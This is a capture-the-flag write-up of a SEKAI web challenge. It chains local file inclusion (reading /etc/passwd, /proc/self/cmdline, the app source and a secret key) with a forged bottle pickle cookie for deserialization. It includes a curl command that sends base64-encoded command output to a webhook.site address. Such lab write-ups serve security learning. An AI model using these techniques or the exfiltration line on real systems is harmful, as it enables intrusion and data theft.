## Skills involved: Local File Inclusion, enumeration and documentation reading, Insecure Object Deserialization

An old-wine-in-new-bottle challenge. While both local file inclusion and insecure object deserialization are basic web exploitation techniques, team Project SEKAI managed to create a plausible scenario for it.

## Solution:

Basic browsing will readily give you this URL, which strongly hints at Local File Inclusion. This is a vulnerability where files outside the application scope can be leaked.

![image](https://user-images.githubusercontent.com/114584910/193473934-677593fa-9418-4456-ad3d-d22ab8cb2033.png)

We can confirm it with a simple `/etc/passwd` payload:

![image](https://user-images.githubusercontent.com/114584910/193474129-03904dbf-d87b-4817-8777-e625f2fe8bb7.png)

Now we need to know what information we need to obtain, because we can't really read directory contents. We can look for web application source code since this is a usual *web* challenge - as compared to *box* techniques like looking for SSH creds or other unexposed services. ~I'm just not familiar with boxes~

We can either guess `/app/app.py` or use `/proc/self/cmdline` for the less guessy route (moved to Burp for better illustration):

![image](https://user-images.githubusercontent.com/114584910/193474449-b9b2e71c-da4f-4c8b-842d-ec8022455979.png)

Here is a list of interesting files from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#interesting-linux-files)


Anyway, the app source can be acquired:

```py
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

Now we need to determine the next step, a natural guess would be to become admin and use the new endpoint `/sign`. And since we have LFI, we can obtain the key at `/app/config/secret.py`. I'm good with this educated guess.
`sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"`

There are 2 ways to craft the cookie: by *reading the documentation/program source* or *running bottle locally*. Since we already have all we need, why not just run the server to save time?

```py
from bottle import route, run, response
sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
@route('/')
def home():
    e = {"name":"admin"}
    response.set_cookie("name", e, secret=sekai)
    return ''

run(host='localhost', port=8080)
```
![image](https://user-images.githubusercontent.com/114584910/193475056-26677d5c-766a-448d-bb42-d9eea7554b7a.png)

Then I was stuck, *terribly* stuck. It didn't occur to me that the cookie has a base64 encoded python pickle until I read the documentation as hinted by the organisers. ~Or you can learn to recognize the pickle pattern~

![image](https://user-images.githubusercontent.com/114584910/193475166-c6f4d30b-ea2d-4ae9-b70a-289ed40c4147.png)

For people that have some prior experience to CTFs, it's at this moment they realize they've got a jackpot:

![image](https://user-images.githubusercontent.com/114584910/193475243-6643e736-6aa3-4824-9e8f-3c3b4cdb5389.png)

We now have to find a way to achieve enumeration (gotta `ls` to my liking) and find the flag. The imminent issue is that there are no static folders for us to copy anything to read, and we don't have write access in general.
Thankfully it's possible to use online services like [webhook.site] to capture any data. With some research the payload can be `curl -d \`... | base64 -w0\` https://webhook.site/...`:

Simple enumeration reveals the flag executable at `/flag`:

![image](https://user-images.githubusercontent.com/114584910/193475478-1918ddc4-8a8d-4ea2-aacf-cf39db0e1ff2.png)

The flag comes happily afterwards.
